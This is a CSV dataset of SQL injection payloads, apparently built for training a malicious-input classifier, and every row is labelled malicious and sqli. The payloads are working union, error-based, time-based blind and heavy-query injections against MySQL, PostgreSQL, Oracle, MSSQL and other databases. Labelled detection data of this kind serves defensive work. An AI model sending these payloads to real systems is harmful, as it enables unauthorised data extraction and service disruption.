payload,label,attack_type
"1%')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('%'='",malicious,sqli
1'));select case when 2930=7964 then 1 else null end--,malicious,sqli
"1""));begin user_lock.sleep(5); end and ((""cxoi""=""cxoi",malicious,sqli
"1"" where 4808=4808 union all select null,null,null,null,null,null,null#",malicious,sqli
"1') where 3579=3579 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",malicious,sqli
"-5230"") or elt(1032=1032,3623) and (""aivb"" like ""aivb",malicious,sqli
"1%"" or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,sqli
"1"" where 8016=8016;select count(*) from generate_series(1,5000000)--",malicious,sqli
1') as lgex where 4068=4068 and 1378=9247--,malicious,sqli
"-5617) where 2132=2132 union all select 2132,2132,2132,2132#",malicious,sqli
"-8893%') union all select 1254,1254--",malicious,sqli
"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",malicious,sqli
"1' where 3760=3760 union all select null,null,null,null,null,null,null,null#",malicious,sqli
"1 and 8635=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((6977=6977",malicious,sqli
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'ugum' like 'ugum",malicious,sqli
"1)) as mgvw where 4923=4923 union all select null,null,null,null--",malicious,sqli
"1'||(select 'bhxx' where 2585=2585;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
"1) union all select null,null,null,null,null,null,null--",malicious,sqli
"1"" and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
-8447 where 2850=2850 or 7147=3262,malicious,sqli
"1))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"-5014"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""dkyp"" like ""dkyp",malicious,sqli
"1') where 1363=1363;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
"1%') union all select null,null,null,null--",malicious,sqli
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('ztmd'='ztmd",malicious,sqli
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('beoh'='beoh",malicious,sqli
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('bzak' like 'bzak",malicious,sqli
"-2982' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'iqwn'='iqwn",malicious,sqli
"-4317"")) as nxvn where 2566=2566 union all select 2566,2566,2566#",malicious,sqli
1);begin user_lock.sleep(5); end--,malicious,sqli
"-9944"")) or 8537=2039 and ((""kfzj""=""kfzj",malicious,sqli
"1"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""endx""=""endx",malicious,sqli
(7098=7098 and sleep(5)),malicious,sqli
"1) where 8375=8375;select * from generate_series(6468,6468,case when (6468=7999) then 1 else 0 end) limit 1--",malicious,sqli
1%';select (case when (3677=2193) then 3677 else 1/(select 0) end)--,malicious,sqli
"-9565"" where 1616=1616 union all select 1616,1616,1616,1616--",malicious,sqli
"-5411%"")) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",malicious,sqli
-2569' union all select 4484--,malicious,sqli
"1) as ahfj where 4776=4776 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
-6548 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- rlda,malicious,sqli
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)-- ixlk",malicious,sqli
"-5032' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",malicious,sqli
"1%' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and '%'='",malicious,sqli
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('ywbs'='ywbs,malicious,sqli
"-3781%') union all select 7497,7497,7497,7497,7497--",malicious,sqli
"1';select count(*) from generate_series(1,5000000)--",malicious,sqli
"1%""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""%""=""",malicious,sqli
"-8919"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""nstr""=""nstr",malicious,sqli
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",malicious,sqli
-4057') order by 1#,malicious,sqli
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""fpqh""=""fpqh",malicious,sqli
-6327')) union all select 2685--,malicious,sqli
"1"") as ymto where 3453=3453;select benchmark(5000000,md5(0x4c4d6142))--",malicious,sqli
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('cssb'='cssb",malicious,sqli
"1%""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,sqli
"1%')));select count(*) from generate_series(1,5000000)--",malicious,sqli
"1""""(.'.(,(.",malicious,sqli
"1"") where 4567=4567 or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
-5820')) as lkik where 4044=4044 or 7156=9197--,malicious,sqli
"1' where 4388=4388;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
"1') as kqbh where 6138=6138;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"-7916')) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",malicious,sqli
"1"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""bzzt"" like ""bzzt",malicious,sqli
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- gkcl",malicious,sqli
1');select (case when (7217=7631) then 7217 else 7217*(select 7217 from information_schema.character_sets) end)#,malicious,sqli
"1"") where 6679=6679 rlike sleep(5)#",malicious,sqli
"1"") and 8407=(select count(*) from generate_series(1,5000000)) and (""kssm""=""kssm",malicious,sqli
"1' where 9605=9605 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",malicious,sqli
"1"")) and (1248=8705)*8705 and ((""wvma"" like ""wvma",malicious,sqli
"1"" where 1982=1982;(select * from (select(sleep(5)))acdk)#",malicious,sqli
"1 or elt(6272=6272,sleep(5))# klaw",malicious,sqli
"1' in boolean mode) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#",malicious,sqli
1)) rlike (select * from (select(sleep(5)))vwyq)#,malicious,sqli
"1)) and 8407=(select count(*) from generate_series(1,5000000)) and ((4450=4450",malicious,sqli
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,sqli
"1%');select benchmark(5000000,md5(0x4c4d6142)) and ('%'='",malicious,sqli
"-6906' where 1839=1839 union all select 1839,1839,1839,1839,1839--",malicious,sqli
"1"") where 2312=2312 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",malicious,sqli
"1%"")) union all select null,null,null,null,null,null--",malicious,sqli
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('bmhw' like 'bmhw,malicious,sqli
"1"" or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
1 and (3020=3020)*6703# syuj,malicious,sqli
"1%""))) union all select null,null,null,null,null,null,null--",malicious,sqli
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""vkqt""=""vkqt",malicious,sqli
"1%')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1) as rqac where 3381=3381 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,malicious,sqli
"-7008')) union all select 9080,9080,9080#",malicious,sqli
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",malicious,sqli
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('obeh'='obeh",malicious,sqli
"1')) as cimd where 9608=9608;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'oofd'='oofd,malicious,sqli
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('aumk' like 'aumk",malicious,sqli
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",malicious,sqli
"-4826 union all select 4532,4532,4532,4532,4532--",malicious,sqli
-1643' where 1968=1968 or 3484=6642,malicious,sqli
1) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (9932=9932,malicious,sqli
"-6770')) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",malicious,sqli
1' rlike (select * from (select(sleep(5)))sgvo) and 'mabd'='mabd,malicious,sqli
-3559') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),malicious,sqli
"1) where 6990=6990 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1)) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((5776=5776",malicious,sqli
"1'||(select 'eamo' where 4958=4958 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))||'",malicious,sqli
1)));begin dbms_lock.sleep(5); end and (((4675=4675,malicious,sqli
"1"")) as ltco where 3862=3862 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
1) where 4653=4653 or 6793=(select 6793 from pg_sleep(5))--,malicious,sqli
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xonc'='xonc",malicious,sqli
"1"" where 1386=1386;select (case when (3435=4011) then 1 else 3435*(select 3435 from master..sysdatabases) end)--",malicious,sqli
"1 or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1) as dqda where 1624=1624 and 8635=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1""));select case when 1802=7063 then 1 else null end--",malicious,sqli
"1"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""vudj"" like ""vudj",malicious,sqli
"1"")) as turj where 1237=1237;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,sqli
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('crus'='crus",malicious,sqli
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'esjl'='esjl",malicious,sqli
"-7656""))) union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",malicious,sqli
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",malicious,sqli
-7242' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'kfff'='kfff,malicious,sqli
"1"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",malicious,sqli
"1"")) union all select null,null,null,null,null,null#",malicious,sqli
"-4692%"")) union all select 1781,1781#",malicious,sqli
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",malicious,sqli
"-4056""))) union all select 4363,4363,4363,4363,4363,4363,4363,4363#",malicious,sqli
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",malicious,sqli
-7951'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('blak'='blak,malicious,sqli
-7231)) union all select 7639#,malicious,sqli
"1%"") union all select null,null,null,null,null,null,null,null,null#",malicious,sqli
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""oyuj""=""oyuj",malicious,sqli
"1""))) union all select null#",malicious,sqli
"1' where 2202=2202 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"-5145' where 2334=2334 union all select 2334,2334,2334,2334--",malicious,sqli
1'+(select ggah where 3263=3263 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))+',malicious,sqli
"1))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((4858=4858",malicious,sqli
1') and 7533=7533 and ('dbjq'='dbjq,malicious,sqli
"1)) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((9313=9313",malicious,sqli
"1))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((6578=6578",malicious,sqli
"1)))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((3950=3950",malicious,sqli
"1') as idqc where 5288=5288 and elt(1210=1210,sleep(5))--",malicious,sqli
"1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('zxrb'='zxrb",malicious,sqli
"1' where 8869=8869 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",malicious,sqli
"1) and make_set(8403=8403,8899)",malicious,sqli
"1%""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""%""=""",malicious,sqli
"1)) as zkrr where 4730=4730 or 8466=benchmark(5000000,md5(0x694a4745))--",malicious,sqli
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",malicious,sqli
"-5227"" union all select 2666--",malicious,sqli
"1'+(select xwcl where 7997=7997;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
"1) as zelk where 1944=1944 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1%"")) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1' in boolean mode);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
"1%"";waitfor delay '0:0:5' and ""%""=""",malicious,sqli
"1"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""igop""=""igop",malicious,sqli
"1"" where 3274=3274 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",malicious,sqli
"1') union all select null,null,null,null#",malicious,sqli
"-3230"")) as kbxc where 5007=5007 or 2107=8818",malicious,sqli
"1%' union all select null,null,null,null,null,null,null,null,null--",malicious,sqli
1%') and 6969=(select 6969 from pg_sleep(5)) and ('%'=',malicious,sqli
"1'))) or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
"1'+(select bptu where 7356=7356 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))+'",malicious,sqli
1' in boolean mode) union all select null--,malicious,sqli
"1') as elnu where 5719=5719 or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
1) where 1402=1402;select sleep(5)#,malicious,sqli
"-1525'))) union all select 4110,4110,4110,4110,4110,4110#",malicious,sqli
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (3770=3770",malicious,sqli
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""mbas""=""mbas",malicious,sqli
-1468'))) or 4875=6163#,malicious,sqli
"-9451%"") union all select 9963,9963,9963--",malicious,sqli
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('svhx'='svhx,malicious,sqli
-8099%')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',malicious,sqli
"-1164"") union all select 6617,6617,6617,6617,6617,6617--",malicious,sqli
"1') where 6489=6489 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",malicious,sqli
1 where 6827=6827;select case when 7717=7717 then 1 else null end--,malicious,sqli
"1') and make_set(8403=8403,8899) and ('kyxl'='kyxl",malicious,sqli
"-2979')) as klou where 7092=7092 union all select 7092,7092--",malicious,sqli
"1"" union all select null--",malicious,sqli
"-1620)) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",malicious,sqli
"1"" or elt(6272=6272,sleep(5))",malicious,sqli
"1""));select pg_sleep(5)--",malicious,sqli
-3304')) order by 1--,malicious,sqli
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""adwg"" like ""adwg",malicious,sqli
"1%"") union all select null,null,null,null,null#",malicious,sqli
1') where 8776=8776 and 6969=(select 6969 from pg_sleep(5))--,malicious,sqli
"1%"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",malicious,sqli
-3862') or 9323=9323#,malicious,sqli
1');select pg_sleep(5)--,malicious,sqli
"-2106"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""dvlq"" like ""dvlq",malicious,sqli
"1"") as gdcx where 2335=2335 and 6969=(select 6969 from pg_sleep(5))--",malicious,sqli
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",malicious,sqli
"1') and 8635=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1'))) union all select null,null,null,null,null,null,null,null,null,null--",malicious,sqli
"1""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""text"" like ""text",malicious,sqli
"-8203)) as eqlf where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",malicious,sqli
"1 where 8398=8398;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
1 where 5161=5161 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,malicious,sqli
"1' where 1628=1628 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1) as qjbd where 2808=2808 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",malicious,sqli
"1')) or elt(6272=6272,sleep(5)) and (('zjel' like 'zjel",malicious,sqli
1')) as txxn where 7884=7884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,malicious,sqli
-5299 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),malicious,sqli
1 where 8532=8532;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,malicious,sqli
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"1""))) or sleep(5)#",malicious,sqli
"1"")) as ylah where 9248=9248;select pg_sleep(5)--",malicious,sqli
-3834')) as hhiy where 2086=2086 or 3038=3038,malicious,sqli
-2241) where 7606=7606 or (8459=8459)*4906--,malicious,sqli
1')) as wqhm where 9871=9871;(select * from (select(sleep(5)))srmq)--,malicious,sqli
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",malicious,sqli
-1459'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('eiet' like 'eiet,malicious,sqli
1');if(7899=7899) select 7899 else drop function zbbp--,malicious,sqli
"1"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""cwat"" like ""cwat",malicious,sqli
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",malicious,sqli
"-9762) or elt(5773=8986,8986)",malicious,sqli
"-4233%"") or (8459=8459)*4906 and (""%""=""",malicious,sqli
1'||(select 'ptfi' from dual where 2234=2234 and 2006=2006,malicious,sqli
"1') union all select null,null,null,null,null,null#",malicious,sqli
"1""))) or elt(6272=6272,sleep(5)) and (((""hxgu""=""hxgu",malicious,sqli
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))-- huss",malicious,sqli
1') where 6305=6305 rlike (select (case when (8326=9749) then 1 else 0x28 end))--,malicious,sqli
"1')) as jpxj where 6153=6153 or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1""))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""wtkx""=""wtkx",malicious,sqli
"-6112"") union all select 8203,8203,8203,8203,8203,8203,8203--",malicious,sqli
1'));waitfor delay '0:0:5'--,malicious,sqli
"-5391 or make_set(9354=9354,7185)# ptyy",malicious,sqli
"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('ocfi'='ocfi",malicious,sqli
"1) union all select null,null,null,null,null,null,null#",malicious,sqli
"1') where 8211=8211 union all select null,null,null,null,null#",malicious,sqli
"1)) as ehlg where 6340=6340;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
-3899') where 8152=8152 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,malicious,sqli
"-6662"")) union all select 6755--",malicious,sqli
"1%"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""%""=""",malicious,sqli
"-7101))) union all select 4587,4587,4587,4587,4587,4587--",malicious,sqli
"-6496""))) or 1471=5278 and (((""zkoj""=""zkoj",malicious,sqli
"-8238')) union all select 9797,9797,9797,9797,9797,9797,9797,9797#",malicious,sqli
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('ohqs' like 'ohqs,malicious,sqli
"1"") where 5719=5719 rlike sleep(5)--",malicious,sqli
"1"")) and 5421=4804--",malicious,sqli
"1"")) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((""tbdl"" like ""tbdl",malicious,sqli
"1' where 4880=4880 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",malicious,sqli
